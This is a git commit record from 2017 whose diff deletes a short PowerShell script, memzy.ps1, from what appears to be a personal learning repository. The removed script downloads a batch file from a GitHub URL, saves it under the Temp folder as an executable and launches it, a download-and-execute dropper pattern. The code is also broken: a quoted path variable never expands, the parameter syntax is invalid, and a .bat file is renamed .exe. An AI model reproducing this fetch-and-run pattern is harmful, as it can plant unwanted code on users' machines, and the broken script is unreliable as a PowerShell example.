8d3127b88b1c84d056c28140ee211a52dad52e53
deathlimited <denis_srk@live.com>
2017-11-17 03:44:46 +0200

    Delete memzy.ps1

--- memzy.ps1
+++
@@ -1,6 +0,0 @@
-
-$url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
-$outpath = '$env:Temp\myexe.exe'
-Invoke-WebRequest -Uri = $url -OutFile $outpath
-$args = @('Comma','Separated','Arguments')
-Start-Process -Filepath "$env:Temp\myexe.exe" -ArgumentList $args
